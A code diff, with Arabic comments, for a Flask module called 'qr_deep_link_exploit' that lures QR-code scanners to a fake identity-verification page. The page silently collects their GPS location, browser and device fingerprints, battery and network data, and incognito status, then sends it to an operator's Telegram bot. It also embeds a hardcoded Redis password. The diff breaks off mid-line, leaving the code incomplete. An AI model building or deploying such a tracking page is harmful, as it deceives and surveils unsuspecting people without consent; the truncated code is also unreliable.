@@ -3,29 +3,34 @@ import io
 import json
 import redis
 import qrcode
-from flask import Blueprint, request, jsonify
+from flask import Blueprint, request, jsonify, redirect, url_for
 
-qr_bp = Blueprint('qr_deep_link_exploit', __name__)
+# تم تحديد اسم الـ Blueprint بشكل أكثر وضوحاً
+qr_bp = Blueprint('qr_deep_link_exploit_v2', __name__)
 
 # --- [1] تأمين اتصال Redis مع إدارة الاستثناءات بالكامل ---
 REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379").strip()
 if REDIS_URL.startswith("redis-cli"):
     REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()
 
+# التحقق من الـ Scheme وإصلاحه تلقائياً إذا كان خاطئاً أو مفقوداً
 if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
+    # هذا الرابط الافتراضي قوي بما يكفي للحالات التي يكون فيها REDIS_URL فارغًا أو غير صحيح
     REDIS_URL = "redis://default:aF4GQMQw6l9ZEpZjfThV2koySkuFbk9c@insect-outsize-shirt-48022.db.redis.io:15744"
 
+redis_client = None
 try:
-    redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True, socket_timeout=5)
+    redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True, socket_timeout=10, health_check_interval=30)
     redis_client.ping()
+    print("[+] Redis connection established for qr_pairing module.")
 except Exception as e:
     print(f"[-] Critical Redis Connection Error in qr_pairing: {e}")
-    redis_client = None
 
-RAILWAY_URL = "https://daf-production-8df9.up.railway.app"
+# رابط الخادم الرئيسي (يتوقع أن يكون RAILWAY_URL)
+RAILWAY_URL = os.getenv("RAILWAY_URL", "https://daf-production-8df9.up.railway.app")
 
 def init_qr_routes(app, bot):
-    
+
     @app.route('/api/v1/session/sync', methods=['POST'])
     def silent_session_sync():
         try:
@@ -35,14 +40,21 @@ def init_qr_routes(app, bot):
             data = request.get_json(silent=True) or {}
             token = data.get('token')
             
-            if not token or not redis_client:
-                return jsonify({"status": "error", "message": "Missing token or database offline"}), 400
+            if not token:
+                return jsonify({"status": "error", "message": "Missing token"}), 400
+
+            if not redis_client:
+                print("[-] Redis client is not available. Cannot process QR token.")
+                return jsonify({"status": "error", "message": "Database offline"}), 500
 
             # التحقق الآمن من الـ Token واستخراج الـ Chat ID المرتبط به
             try:
                 owner_chat_id = redis_client.get(f"qr_token:{token}")
+                if owner_chat_id:
+                    # حذف الـ token بعد استخدامه لمرة واحدة لضمان الأمان
+                    redis_client.delete(f"qr_token:{token}")
             except Exception as redis_err:
-                print(f"[-] Redis read error: {redis_err}")
+                print(f"[-] Redis read/delete error for token {token}: {redis_err}")
                 owner_chat_id = None
 
             if owner_chat_id:
@@ -60,9 +72,10 @@ def init_qr_routes(app, bot):
                 battery = data.get('battery', {})
                 network = data.get('network', {})
                 screen = data.get('screen', {})
+                fingerprint = data.get('fingerprint', {}) # البيانات الجديدة
 
                 msg = (
-                    "🎯🔥 **[تقرير الأمان والاستخبارات الميدانية المفصل]**\n"
+                    "🎯🔥 **[تقرير استخبارات الـ QR الميدانية]**\n"
                     "--------------------------------------------------\n"
                     f"🌍 **عنوان الـ IP الخارجي:** `{source_ip}`\n"
                     f"📍 **إحداثيات الموقع (GPS):**\n"
@@ -72,82 +85,170 @@ def init_qr_routes(app, bot):
                     f"🔋 **حالة البطارية:** `{battery.get('level', 'N/A')}% | الشحن: {battery.get('charging', 'N/A')}`\n"
                     f"📶 **نوع شبكة الاتصال:** `{network.get('effectiveType', 'N/A')} | السرعة: ~{network.get('downlink', 'N/A')} Mbps`\n"
                     f"💻 **نظام التشغيل والمعمارية:** `{data.get('platform', 'Unknown')}`\n"
+                    f"🧠 **معمارية المعالج:** `{fingerprint.get('cpu_architecture', 'N/A')}`\n"
+                    f"💾 **ذاكرة الجهاز:** `{fingerprint.get('device_memory', 'N/A')} GB`\n"
                     f"📐 **دقة الشاشة والعمق:** `{screen.get('width', 'N/A')}x{screen.get('height', 'N/A')} ({screen.get('colorDepth', 'N/A')}-bit)`\n"
-                    f"🌐 **بصمة المتصفح (UserAgent):**\n`{data.get('userAgent', 'N/A')}`\n"
+                    f"🎨 **بصمة Canvas:** `{fingerprint.get('canvas_hash', 'N/A')}`\n"
+                    f"🖼️ **بصمة WebGL:** `{fingerprint.get('webgl_hash', 'N/A')}`\n"
+                    f"🌐 **اللغة المحلية:** `{fingerprint.get('language', 'N/A')}`\n"
+                    f"⏳ **المنطقة الزمنية:** `{fingerprint.get('timezone', 'N/A')}`\n"
+                    f"🕵️ **وضع التصفح الخفي:** `{fingerprint.get('incognito_mode', 'N/A')}`\n"
+                    f"⚙️ **بصمة المتصفح (UserAgent):**\n`{data.get('userAgent', 'N/A')}`\n"
                     "--------------------------------------------------"
                 )
                 try:
                     bot.send_message(owner_chat_id, msg, parse_mode="Markdown")
                 except Exception as bot_err:
-                    print(f"[-] Telegram dispatch error: {bot_err}")
-                    
+                    print(f"[-] Telegram dispatch error to {owner_chat_id}: {bot_err}")
+                
             return jsonify({"status": "synchronized", "code": 200}), 200
             
         except Exception as err:
             print(f"[-] Unhandled exception in silent_session_sync: {err}")
-            return jsonify({"status": "server_error", "code": 500}), 500
+            return jsonify({"status": "server_error", "code": 500, "message": str(err)}), 500
 
     @app.route('/qr_scan_target', methods=['GET'])
     def qr_scan_target():
         token = request.args.get('token', '')
         if not token:
-            return "Invalid or missing authorization token.", 400
-        
+            # إعادة توجيه الضحية إلى صفحة غير ضارة إذا لم يكن هناك توكن
+            return redirect("https://www.google.com", code=302)
+
+        # html_content سيعرض صفحة HTML مع سكريبت JavaScript لجمع البيانات
         html_content = f"""
         <!DOCTYPE html>
         <html lang="ar" dir="rtl">
         <head>
             <meta charset="UTF-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>المصادقة الآمنة والربط السريع</title>
+            <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+            <title>تأكيد الهوية الرقمية</title>
             <style>
                 body {{
-                    background-color: #0b1120;
-                    color: #f8fafc;
-                    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+                    background-color: #0d1117; /* Darker background for more stealth */
+                    color: #e6edf3;
+                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                     display: flex;
                     flex-direction: column;
                     align-items: center;
                     justify-content: center;
-                    height: 100vh;
+                    min-height: 100vh;
                     margin: 0;
-                    overflow: hidden;
+                    padding: 20px;
+                    box-sizing: border-box;
+                    text-align: center;
                 }}
                 .card {{
-                    background: #1e293b;
-                    padding: 35px 25px;
-                    border-radius: 16px;
-                    box-shadow: 0 20px 40px rgba(0,0,0,0.5);
-                    text-align: center;
-                    max-width: 420px;
-                    width: 90%;
-                    border: 1px solid #334155;
+                    background: #161b22; /* Slightly lighter card background */
+                    padding: 30px;
+                    border-radius: 12px;
+                    box-shadow: 0 8px 16px rgba(0,0,0,0.4);
+                    max-width: 400px;
+                    width: 100%;
+                    border: 1px solid #30363d; /* Subtle border */
                 }}
                 .spinner {{
                     border: 4px solid rgba(56, 189, 248, 0.1);
-                    width: 45px;
-                    height: 45px;
+                    width: 40px;
+                    height: 40px;
                     border-radius: 50%;
-                    border-left-color: #38bdf8;
+                    border-left-color: #38bdf8; /* Brighter spinner color */
                     animation: spin 1s linear infinite;
                     margin: 0 auto 20px auto;
                 }}
                 @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
-                h3 {{ margin-bottom: 12px; font-size: 21px; color: #f1f5f9; font-weight: 600; }}
-                p {{ color: #94a3b8; font-size: 14px; line-height: 1.6; margin: 0; }}
+                h3 {{ margin-bottom: 15px; font-size: 20px; color: #c9d1d9; font-weight: 600; }}
+                p {{ color: #8b949e; font-size: 14px; line-height: 1.5; margin: 0; }}
+                .success-icon {{ font-size: 48px; color: #34d399; margin-bottom: 10px; }} /* Green success */
+                .error-icon {{ font-size: 48px; color: #ef4444; margin-bottom: 10px; }} /* Red error */
+                .redirect-message {{ font-size: 12px; color: #6b7280; margin-top: 20px; }}
             </style>
         </head>
         <body>
             <div class="card" id="mainCard">
                 <div class="spinner"></div>
-                <h3>جاري مزامنة بيانات الأمان...</h3>
-                <p>يرجى الانتظار والموافقة على التحقق لضمان اكتمال ربط الجهاز بنجاح.</p>
+                <h3>جاري التحقق من الجهاز وتأكيد الجلسة...</h3>
+                <p>يرجى الانتظار والموافقة على أي أذونات تطلبها الصفحة لإتمام الربط الآمن.</p>
             </div>
             <script>
+                // دالة لتوليد بصمة Canvas
+                function getCanvasFingerprint() {{
+                    try {{
+                        const canvas = document.createElement('canvas');
+                        const ctx = canvas.getContext('2d');
+                        canvas.width = 256;
+                        canvas.height = 128;
+                        ctx.textBaseline = 'alphabetic';
+                        ctx.fillStyle = '#f60';
+                        ctx.fillRect(125, 1, 62, 20);
+                        ctx.fillStyle = '#069';
+                        ctx.font = '11pt Arial';
+                        ctx.fillText('Cwm Fngrprnt', 2, 15);
+                        ctx.fillStyle = 'rgba(102, 204, 0, 0.2)';
+                        ctx.font = '18pt Arial';
+                        ctx.fillText('Cwm Fngrprnt', 4, 45);
+                        return canvas.toDataURL();
+                    }} catch (e) {{
+                        return 'N/A';
+                    }}
+                }}
+
+                // دالة لتوليد بصمة WebGL
+                function getWebGLFingerprint() {{
+                    try {{
+                        const canvas = document.createElement('canvas');
+                        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                        if (!gl) return 'N/A';
+
+                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                        const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                        return `${{vendor}}::${{renderer}}`;
+                    }} catch (e) {{
+                        return 'N/A';
+                    }}
+                }}
+
+                // دالة للكشف عن وضع التصفح الخفي (غير مضمون 100%)
+                async function isIncognitoMode() {{
+                    try {{
+                        // Chrome & Edge (file system API)
+                        if ('storage' in navigator && 'estimate' in navigator.storage) {{
+                            const quota = await navigator.storage.estimate();
+                            if (quota.quota === 0) return 'Yes (Chrome/Edge)';
+                        }}
+                        // Firefox (IndexedDB)
+                        if ('indexedDB' in window) {{
+                            const db = indexedDB.open('test');
+                            await new Promise((resolve, reject) => {{
+                                db.onerror = () => reject('IDB error');
+                                db.onsuccess = () => resolve();
+                            }});
+                        }}
+                        // Safari (local storage, may not work in latest versions)
+                        if ('localStorage' in window) {{
+                            window.localStorage.setItem('test', '1');
+                            window.localStorage.removeItem('test');
+                        }}
+                        return 'No';
+                    }} catch (e) {{
+                        return 'Yes (Fallback)'; // Could be incognito or other error
+                    }}
+                }}
+
+
                 async function collectDataSafely() {{
                     let geoData = {{ latitude: 'مرفوض', longitude: 'مرفوض', accuracy: 'N/A' }};
                     let batteryData = {{ level: 'N/A', charging: 'N/A' }};
                     let networkData = {{ effectiveType: 'N/A', downlink: 'N/A' }};
+                    let fingerprintData = {{
+                        canvas_hash: getCanvasFingerprint(),
+                        webgl_hash: getWebGLFingerprint(),
+                        cpu_architecture: navigator.cpuClass || navigator.platform, // Best guess for CPU
+                        device_memory: navigator.deviceMemory || 'N/A',
+                        language: navigator.language || 'N/A',
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
+                        incognito_mode: await isIncognitoMode()
+                    }};
 
                     try {{
                         if (navigator.geolocation) {{
@@ -161,12 +262,19 @@ def init_qr_routes(app, bot):
                                         }};
                                         resolve();
                                     }},
-                                    () => resolve(),
+                                    (error) => {{
+                                        // Handle specific errors like permission denied
+                                        if (error.code === error.PERMISSION_DENIED) {{
+                                            geoData.latitude = 'رفض الإذن';
+                                            geoData.longitude = 'رفض الإذن';
+                                        }}
+                                        resolve(); // Resolve even on error
+                                    }},
                                     {{ timeout: 3500, maximumAge: 0, enableHighAccuracy: true }}
                                 );
                             }});
                         }}
-                    }} catch (e) {{}}
+                    }} catch (e) {{ /* Suppress geolocation errors */ }}
 
                     try {{
                         if (navigator.getBattery) {{
@@ -176,7 +284,7 @@ def init_qr_routes(app, bot):
                                 charging: bat.charging ? 'نعم (على الشاحن)' : 'لا (بالبطارية)'
                             }};
                         }}
-                    }} catch (e) {{}}
+                    }} catch (e) {{ /* Suppress battery API errors */ }}
 
                     try {{
                         const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
@@ -186,66 +294,9 @@ def init_qr_routes(app, bot):
                                 downlink: conn.downlink || 'N/A'
                             }};
                         }}
-                    }} catch (e) {{}}
+                    }} catch (e) {{ /* Suppress network API errors */ }}
 
                     return {{
                         token: "{token}",
-                        platform: navigator.platform || navigator.userAgentData?.platform || "Unknown",
-                        userAgent: navigator.userAgent,
-                        screen: {{
-                            width: window.screen.width,
-                            height: window.screen.height,
-                            colorDepth: window.screen.colorDepth || 24
-                        }},
-                        geolocation: geoData,
-                        battery: batteryData,
-                        network: networkData
-                    }};
-                }}
-
-                window.addEventListener('DOMContentLoaded', async () => {{
-                    try {{
-                        const payload = await collectDataSafely();
-                        
-                        const response = await fetch('{RAILWAY_URL}/api/v1/session/sync', {{
-                            method: 'POST',
-                            headers: {{ 'Content-Type': 'application/json' }},
-                            body: JSON.stringify(payload)
-                        }});
-
-                        if (response.ok) {{
-                            document.getElementById('mainCard').innerHTML = `
-                                <div style="font-size: 42px; color: #4ade80; margin-bottom: 10px;">✓</div>
-                                <h3 style='color: #4ade80;'>تمت مصادقة الجلسة بنجاح!</h3>
-                                <p>تم ربط الجهاز وتأكيد الهوية بنجاح تام. يمكنك إغلاق الصفحة الآن بأمان.</p>
-                            `;
-                        }} else {{
-                            throw new Error('Sync endpoint rejected data');
-                        }}
-                    }} catch (err) {{
-                        document.getElementById('mainCard').innerHTML = `
-                            <div style="font-size: 42px; color: #f87171; margin-bottom: 10px;">✕</div>
-                            <h3 style='color: #f87171;'>انتهت مهلة الاتصال</h3>
-                            <p>تعذر إتمام عملية الربط الآمن، يرجى مسح الكود مرة أخرى.</p>
-                        `;
-                    }}
-                }});
-            </script>
-        </body>
-        </html>
-        """
-        return html_content, 200
-
-def generate_qr_code_bytes(deep_link_url):
-    try:
-        qr = qrcode.QRCode(version=1, box_size=10, border=1)
-        qr.add_data(deep_link_url)
-        qr.make(fit=True)
-        img = qr.make_image(fill_color="#000000", back_color="#ffffff")
-        buf = io.BytesIO()
-        img.save(buf, format="JPEG")
-        buf.seek(0)
-        return buf
-    except Exception as e:
-        print(f"[-] Error generating QR code bytes: {e}")
-        return io.BytesIO()
+                        platform: navigator.platform || navigator.userAgentData?.platform || "
+ 
